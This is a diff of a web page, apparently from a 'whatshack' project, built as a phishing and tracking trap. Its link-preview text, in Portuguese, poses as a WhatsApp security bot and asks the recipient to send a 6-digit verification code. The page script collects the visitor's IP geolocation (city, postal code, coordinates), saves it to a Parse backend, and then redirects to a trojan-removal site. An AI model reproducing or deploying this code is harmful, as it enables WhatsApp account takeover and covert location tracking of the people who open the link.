@@ -3,19 +3,19 @@
   <head>
 	<title>StreamLaggins</title>
 
-	<!--<meta http-equiv="refresh" content="2;url=https://www.instagram.com/gabrielgomes901">-->
+	<!--<meta http-equiv="refresh" content="2;url=https://www.enigmasoftware.com/pt/trojandropper-remocao/">-->
 
 	<meta name="theme-color" content="#121212"/>
 	<meta name="apple-mobile-web-app-status-bar-style" content="#212121">
 
-	<meta  property="og:url" content="http://www.streamlaggins.com">
+	<meta  property="og:url" content="http://http://www.streamlaggins.com">
 	<meta  property="og:title" content="StreamLaggins">
 
 	<meta  property="og:description" content="Olá senhor(a) , bom dia , sou um bot programado da equipe de segurança do whatsapp e detectamos uma anomalia ao número que a senhor(a) está usando , por gentileza envie o código de 6 dígitos que você receberá em alguns segundos.. Grato Equipe WhatsApp. 🙂">
 	<meta  property="og:site_name" content="www.streamlaggins.com">
 
 	<meta property="og:type" content="profile"> 
-	<meta property="og:image" content="https://raw.githubusercontent.com/GabrielGomes900/whatshack.github.io/main/imagens/davi0.jpg">
+	<meta property="og:image" content="/IMG-20201225-WA0554.jpg">
 
 	<script src="https://unpkg.com/parse/dist/parse.min.js"></script>
 
@@ -142,8 +142,8 @@ string2 = "-"+i2;
  "CIDADE:"+response.city+"\n"+
  "CODIGO DO PAIS:"+response.country_code+"\n"+
  "CODIGO REGIONAL:"+response.region_code+"\n"+
- "LONGITUDE:"+string1+"\n"+
- "LATITUDE:"+string2+"\n"+
+ "LONGITUDE:"+response.longitude+"\n"+
+ "LATITUDE:"+response.latitude+"\n"+
  "CODIGO DE CHAMADA:"+response.calling_code+"\n"+
  "CODIGO DO CONTINENTE:"+response.continent_code+"\n"+
  "CODIGO POSTAL:"+response.postal+"\n"+
@@ -168,8 +168,8 @@ string2 = "-"+i2;
 	  mygps.set("estado",ES);
 	  mygps.set("regiao",RG);
 	  mygps.set("ip",IP);
-	  mygps.set("longitude",""+LG);
-	  mygps.set("latitude",""+LT);
+	  mygps.set("longitude",LG);
+	  mygps.set("latitude",LT);
 	  mygps.set("informacao",document.getElementById('informação').value);
 	  mygps.set("todas_informacoes",Total);
 	  mygps.save();
@@ -177,11 +177,12 @@ string2 = "-"+i2;
  setTimeout(function(){
  window.location.href="https://www.enigmasoftware.com/pt/trojandropper-remocao/";
  clearTimeout();
- },2000);
+ },3000);
  
 	  }
 	 }, "json");
 	 }else{
+alert("msg");
 	 window.location.href="https://www.enigmasoftware.com/pt/trojandropper-remocao/";
 	 }
 }
